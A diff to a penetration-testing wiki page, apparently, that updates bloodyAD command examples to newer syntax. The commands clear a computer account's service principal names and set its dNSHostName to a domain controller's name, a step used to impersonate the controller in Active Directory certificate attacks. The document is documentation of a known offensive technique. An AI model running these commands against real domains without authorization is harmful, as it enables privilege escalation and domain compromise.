@@ -68,13 +68,13 @@ The [bloodyAD](https://github.com/CravateRouge/bloodyAD) (Python) tool can be us
 {% code overflow="wrap" %}
 ```bash
 # Clearing the SPNs
-bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' serviceprincipalname '[]'
+bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME serviceprincipalname
 
 # Setting the dNSHostName value to the name of a computer account to impersonate
-bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP setAttribute 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName '["$DC_NAME.$DOMAIN"]'
+bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP set object $COMPUTER_NAME dnsHostName -v '$DC_NAME.$DOMAIN'
 
 # Verifying the dNSHostName value and SPN entries
-bloodyAD.py -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP getObjectAttributes 'CN=$COMPUTER_NAME,CN=Computers,DC=$DC,DC=$DC' dnsHostName,serviceprincipalname
+bloodyAD -d $DOMAIN -u $USER -p $PASSWORD --host $DC_IP get object $COMPUTER_NAME --attr dnsHostName,serviceprincipalname
 ```
 {% endcode %}
 
